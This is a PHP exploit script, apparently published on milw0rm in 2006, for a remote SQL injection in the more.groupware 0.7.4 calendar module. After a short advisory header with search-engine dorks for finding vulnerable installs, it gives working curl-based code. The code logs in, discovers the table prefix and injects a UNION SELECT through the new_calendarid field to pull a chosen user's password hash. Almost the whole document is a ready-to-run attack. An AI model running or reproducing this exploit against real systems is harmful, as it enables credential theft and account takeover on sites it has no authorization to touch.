<?
/*
ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
                                  oo    ooooooo     ooooooo
                    oooo   oooo o888  o88     888 o888   888o
                      888o888    888        o888   888888888
                      o88888o    888     o888   o 888o   o888
                    o88o   o88o o888o o8888oooo88   88ooo88
ooooooooooooooooooo more.groupware 0.7.4 remote sql injection oooooooooooooooooo


oo background ooooooooo
more.groupware is a web-based groupware application written in php.

+ http://mgw.k-fish.de

oo fingerprint ooooo
google : http://www.google.com/search?q=%22Login+-+moregroupware%22
         107 results
msn    : http://search.msn.com/results.aspx?q=%22Login+-+moregroupware%22
         204 results

oo analysis ooooooooooo
xx select data from the database 
------------------------------ week.php - line 133 -----------------------------
$sql = "SELECT id, $concat AS name FROM mgw_users WHERE NOT(level=".UDELETED.") 
AND id = ".$_POST["new_calendarid"];
--------------------------------------------------------------------------------

you can find this security issue in other files.

oo exploit oooooooooooo
------------------------------ mg-074-exploit.php ------------------------------
*/

error_reporting(E_ERROR);

function exploit_init()
{
    if (!extension_loaded('php_curl') && !extension_loaded('curl'))
    {
       if (!dl('curl.so') && !dl('php_curl.dll'))
       die ("oo error - cannot load curl extension!");
    }
}

function exploit_header()
{
    echo "\noooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo";
    echo "                                  oo    ooooooo     ooooooo\n";
    echo "                    oooo   oooo o888  o88     888 o888   888o\n";
    echo "                      888o888    888        o888   888888888\n";
    echo "                      o88888o    888     o888   o 888o   o888\n";
    echo "                    o88o   o88o o888o o8888oooo88   88ooo88\n";
    echo "ooooooooooooooooooo more.groupware 0.7.4 remote sql injection oooooooooooooooooo\n";
    echo "oo usage          $ php mg-074-exploit.php [url] [user] [pwd] [id]\n";
    echo "oo proxy support  $ php mg-074-exploit.php [url] [user] [pwd] [id]\n";
    echo "                  [proxy]:[port]\n";
    echo "oo example        $ php mg-074-exploit.php http://localhost x128 pwd 1\n";
    echo "oo you need an account on the system\n";
    echo "oo print the password of the user\n\n";
}

function exploit_bottom()
{
    echo "\noo message  : sanja - es tut mir sehr leid, was ich zu dir gesagt habe. ich war\n";
    echo "              nicht ich selbst. ich hoffe, dass du diesen exploit als wiedergut-";
    echo "              machung verstehst. ich haette dich zwar lieber zum eisessen\n"; 
    echo "              eingeladen, aber ich traue mich nicht mehr dich zu fragen ;).\n";
    echo "oo discover : x128 - alexander wilhelm - 17/09/2006\n";
    echo "oo contact  : exploit <at> x128.net                    oo website : www.x128.net\n";
}

function exploit_execute()
{
    $connection = curl_init();

    if ($_SERVER['argv'][5])
    {
        curl_setopt($connection, CURLOPT_TIMEOUT, 8);
        curl_setopt($connection, CURLOPT_PROXY, $_SERVER['argv'][5]);
    }
    curl_setopt ($connection, CURLOPT_USERAGENT, 'x128');
    curl_setopt ($connection, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt ($connection, CURLOPT_HEADER, 0);
    curl_setopt ($connection, CURLOPT_POST, 1);
    curl_setopt ($connection, CURLOPT_COOKIE, 1);
    curl_setopt ($connection, CURLOPT_COOKIEJAR, 'exp-cookie.txt');
    curl_setopt ($connection, CURLOPT_COOKIEFILE, 'exp-cookie.txt');
    curl_setopt ($connection, CURLOPT_URL, $_SERVER['argv'][1] . "/index.php");
    curl_setopt ($connection, CURLOPT_POSTFIELDS, "login=" . $_SERVER['argv'][2] . "&password=" . $_SERVER['argv'][3] . "&checkip=0");
    $source = curl_exec($connection) or die("oo error - cannot connect!\n");

    curl_setopt ($connection, CURLOPT_POST, 1);
    curl_setopt ($connection, CURLOPT_POSTFIELDS, "new_calendarid=x128");
    curl_setopt ($connection, CURLOPT_URL, $_SERVER['argv'][1] . "/modules/calendar/week.php?");
    $source = curl_exec($connection) or die("oo error - cannot connect!\n");

    preg_match("/([0-9a-zA-Z_]*)users/", $source, $prefix);

    curl_setopt ($connection, CURLOPT_POST, 1);
    curl_setopt ($connection, CURLOPT_POSTFIELDS, "new_calendarid=" .urlencode("0 UNION SELECT id,pw FROM " . $prefix[1] . "users WHERE id = " . $_SERVER['argv'][4]));
    curl_setopt ($connection, CURLOPT_URL, $_SERVER['argv'][1] . "/modules/calendar/week.php");
    $source = curl_exec($connection) or die("oo error - cannot connect!\n");

    preg_match("/>([0-9a-f]{32})</", $source, $password);

    if ($password[1])
    {
        echo "oo password       " . $password[1] . "\n\n";
        echo "oo dafaced ...\n";
    }

    curl_close ($connection);
}

exploit_init();
exploit_header();
exploit_execute();
exploit_bottom();

/*
--------------------------------------------------------------------------------

oo greets ooooooooooooo
all coders and security experts over the world.

oo special message ooooo
sanja - es tut mir sehr leid, was ich zu dir gesagt habe. ich war nicht ich selbst. ich hoffe, dass du diesen exploit als wiedergutmachung verstehst. ich haette dich zwar lieber zum eisessen eingeladen, aber ich traue mich nicht mehr dich zu fragen ;).

oo thank you oooooooooo
str0ke - best exploit publisher in the scene.

oo credits oooooooooooo
oo discover : x128 - alexander wilhelm - 17/09/2006
oo contact  : mail <at> x128.net                       oo website : www.x128.net
*/
?>

# milw0rm.com [2006-09-19]
